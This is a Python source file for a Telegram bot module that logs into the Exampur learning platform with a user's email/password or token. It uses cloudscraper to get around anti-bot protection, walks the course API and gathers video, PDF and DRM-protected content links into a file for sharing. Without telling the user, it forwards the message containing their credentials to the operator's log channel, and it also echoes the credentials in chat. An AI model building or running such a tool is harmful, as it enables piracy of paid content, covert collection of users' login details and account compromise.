import json
import os
import requests
from pyrogram import filters
from pyrogram import Client, filters
from pyrogram.types import *
import cloudscraper
from Extractor import app
from datetime import datetime
import pytz
import logging
from config import CHANNEL_ID, BOT_TEXT
from Extractor.core.utils import forward_to_log

# Initialize logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def exampur_txt(app, message):
    try:
        start_time = datetime.now()
        
        # Initial message
        editable = await message.reply_text(
            "🔹 <b>EXAMPUR EXTRACTOR PRO</b> 🔹\n\n"
            "Send login details in this format:\n"
            "1️⃣ <b>ID*Password:</b> <code>ID*Password</code>\n"
            "2️⃣ <b>Token:</b> <code>your_token</code>\n\n"
            "<i>Example:</i>\n"
            "- ID*Pass: <code>user@mail.com*pass123</code>\n"
            "- Token: <code>eyJhbGciOiJ...</code>"
        )

        # Get login details
        input1 = await app.ask(message.chat.id, 
            "🔹 <b>EXAMPUR EXTRACTOR PRO</b> 🔹\n\n"
            "Send login details in this format:\n"
            "1️⃣ <b>ID*Password:</b> <code>ID*Password</code>\n"
            "2️⃣ <b>Token:</b> <code>your_token</code>\n\n"
            "<i>Example:</i>\n"
            "- ID*Pass: <code>user@mail.com*pass123</code>\n"
            "- Token: <code>eyJhbGciOiJ...</code>"
        )
        # After getting user response
        await forward_to_log(input1, "Exampur Extractor")
        raw_text = input1.text
        await input1.delete()

        # Process login
        rwa_url = "https://auth.exampurcache.xyz/auth/login"
        hdr = {
            "appauthtoken": "no_token",
            "User-Agent": "Dart/2.15(dart:io)",
            "content-type": "application/json; charset=UTF-8",       
            "Accept-Encoding": "gzip",
            "content-length": "94",
            "host": "auth.exampurcache.xyz" 
        }

        try:
            if '*' in raw_text:
                # Login with ID*Password
                email, password = raw_text.split("*", 1)
                info = {
                    "phone_ext": "91",
                    "phone": "",
                    "email": email,
                    "password": password
                }
            else:
                # Direct token login
                token = raw_text
                hdr1 = {
                    "appauthtoken": token,
                    "User-Agent": "Dart/2.15(dart:io)",
                    "Accept-Encoding": "gzip",
                    "host": "auth.exampurcache.xyz"
                }

            if '*' in raw_text:
                scraper = cloudscraper.create_scraper()
                res = scraper.post(rwa_url, data=info).content
                output = json.loads(res)
                if 'data' not in output or 'authToken' not in output['data']:
                    await editable.edit_text(
                        "❌ <b>Login Failed</b>\n\n"
                        "Please check your credentials and try again."
                    )
                    return
                token = output["data"]["authToken"]
                hdr1 = {
                    "appauthtoken": token,
                    "User-Agent": "Dart/2.15(dart:io)",
                    "Accept-Encoding": "gzip",
                    "host": "auth.exampurcache.xyz"
                }
        except Exception as e:
            await editable.edit_text(
                "❌ <b>Login Failed</b>\n\n"
                f"Error: <code>{str(e)}</code>\n\n"
                "Please check your credentials and try again."
            )
            return

        try:
            # Fetch courses
            res1 = requests.get("https://auth.exampurcache.xyz/mycourses", headers=hdr1)
            if res1.status_code != 200:
                await editable.edit_text(
                    "❌ <b>Failed to fetch courses</b>\n\n"
                    "Please check your login details and try again."
                )
                return

            b_data = res1.json()['data']
            if not b_data:
                await editable.edit_text(
                    "❌ <b>No Batches Found</b>\n\n"
                    "You don't have any batches available."
                )
                return

            # Format batch information
            batch_text = ""
            for data in b_data:
                batch_text += f"<code>{data['_id']}</code> - <b>{data['title']}</b> 💰\n\n"

            await editable.edit_text(
                f"✅ <b>Login Successful!</b>\n\n"
                f"🆔 <b>Credentials:</b> <code>{raw_text}</code>\n\n"
                f"📚 <b>Available Batches:</b>\n\n{batch_text}"
            )
        except Exception as e:
            await editable.edit_text(
                "❌ <b>Failed to fetch courses</b>\n\n"
                f"Error: <code>{str(e)}</code>\n\n"
                "Please check your login details and try again."
            )
            return

        try:
            # Ask for batch selection
            input2 = await app.ask(
                message.chat.id,
                "<b>📥 Send the Batch ID to download</b>"
            )
            batch_id = input2.text.strip()
            await input2.delete()

            # Fetch subjects
            progress_msg = await message.reply_text(
                "🔄 <b>Processing Large Batch</b>\n"
                f"└─ Initializing batch: <code>{batch_id}</code>"
            )

            scraper = cloudscraper.create_scraper()
            html = scraper.get(f"https://auth.exampurcache.xyz/course_subject/{batch_id}", headers=hdr1).content
            output0 = json.loads(html)
            
            if 'data' not in output0:
                await progress_msg.edit_text("❌ <b>Invalid batch ID or batch not found</b>")
                return

            subjID = output0["data"]
            topic_ids = []
            for data in subjID:
                topic_ids.append(data["_id"])

            topic_ids_str = "&".join(topic_ids)
            
            # Ask for topic selection
            input4 = await app.ask(
                message.chat.id,
                "<b>📥 Select Topics to Download</b>\n\n"
                f"<b>💡 For ALL topics:</b> <code>{topic_ids_str}</code>\n\n"
                "<i>Separate multiple IDs with '&' (e.g. 1&2&3)</i>"
            )
            selected_topics = input4.text.strip()
            await input4.delete()

            # Process topics
            all_urls = []
            processed = 0
            total_topics = len(selected_topics.split('&'))
        except Exception as e:
            await message.reply_text(
                "❌ <b>Failed to process batch</b>\n\n"
                f"Error: <code>{str(e)}</code>\n\n"
                "Please check your batch ID and try again."
            )
            return

        try:
            for topic_id in selected_topics.split('&'):
                topic_id = topic_id.strip()
                
                await progress_msg.edit_text(
                    "🔄 <b>Processing Large Batch</b>\n"
                    f"├─ Progress: {processed}/{total_topics} topics\n"
                    f"├─ Current: <code>{topic_id}</code>\n"
                    f"└─ Links found: {len(all_urls)}"
                )

                # Fetch topic content
                res4 = requests.get(f"https://auth.exampurcache.xyz/course_material/chapter/{topic_id}/{batch_id}", headers=hdr1)
                if res4.status_code != 200:
                    continue

                chapters = res4.json().get('data', [])
                for chapter in chapters:
                    chapter_name = chapter.replace("(", "\\(").replace(")", "\\)")
                    res5 = requests.get(
                        f"https://auth.exampurcache.xyz/course_material/material/{topic_id}/{batch_id}/{chapter_name}",
                        headers=hdr1
                    )
                    if res5.status_code != 200:
                        continue

                    materials = res5.json().get('data', [])
                    for material in materials:
                        title = material.get('title', '')
                        url = material.get('video_link', '')
                        if url:
                            all_urls.append(f"{title}:{url}")

                processed += 1

            if not all_urls:
                await progress_msg.edit_text("❌ <b>No content found in selected topics</b>")
                return

            # Save and send file
            end_time = datetime.now()
            duration = end_time - start_time
            minutes, seconds = divmod(duration.total_seconds(), 60)

            # Count content types
            video_count = sum(1 for url in all_urls if any(ext in url.lower() for ext in ['.mp4', '.m3u8', '.mpd']))
            pdf_count = sum(1 for url in all_urls if '.pdf' in url.lower())
            doc_count = sum(1 for url in all_urls if any(ext in url.lower() for ext in ['.doc', '.docx', '.ppt', '.pptx']))
            drm_count = sum(1 for url in all_urls if '.mpd' in url.lower())

            # Create and save file
            file_name = f"Exampur_{batch_id}_{int(start_time.timestamp())}.txt"
            with open(file_name, 'w', encoding='utf-8') as f:
                f.write('\n'.join(all_urls))

            # Prepare caption
            caption = (
                f"🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
                f"📱 <b>APP:</b> Exampur\n"
                f"📚 <b>BATCH ID:</b> {batch_id}\n"
                f"⏱ <b>EXTRACTION TIME:</b> {int(minutes):02d}:{int(seconds):02d}\n"
                f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
                f"📊 <b>CONTENT STATS</b>\n"
                f"├─ 📁 Total Links: {len(all_urls)}\n"
                f"├─ 🎬 Videos: {video_count}\n"
                f"├─ 📄 PDFs: {pdf_count}\n"
                f"├─ 📑 Documents: {doc_count}\n"
                f"└─ 🔐 Protected: {drm_count}\n\n"
                f"🚀 <b>Extracted by:</b> @{(await app.get_me()).username}\n\n"
                f"<code>╾───• {BOT_TEXT} •───╼</code>"
            )

            # Send file
            await message.reply_document(
                document=file_name,
                caption=caption,
                parse_mode="html"
            )

            # Cleanup
            try:
                os.remove(file_name)
            except:
                pass

            await progress_msg.edit_text(
                "✅ <b>Extraction completed successfully!</b>\n\n"
                f"📊 𝗙𝗶𝗻𝗮𝗹 𝗦𝘁𝗮𝘁𝘂𝘀:\n"
                f"📚 Processed {total_topics} topics\n"
                f"📤 File has been uploaded\n\n"
                f"Thank you for using UG Extractor Pro! 🌟"
            )
        except Exception as e:
            await message.reply_text(
                "❌ <b>Failed to process topics</b>\n\n"
                f"Error: <code>{str(e)}</code>\n\n"
                "Please try again or contact support."
            )
            return
    except Exception as e:
        logger.error(f"Error in exampur_txt: {e}")
        await message.reply_text(
            "❌ <b>An error occurred</b>\n\n"
            f"Error details: <code>{str(e)}</code>\n\n"
            "Please try again or contact support."
        )


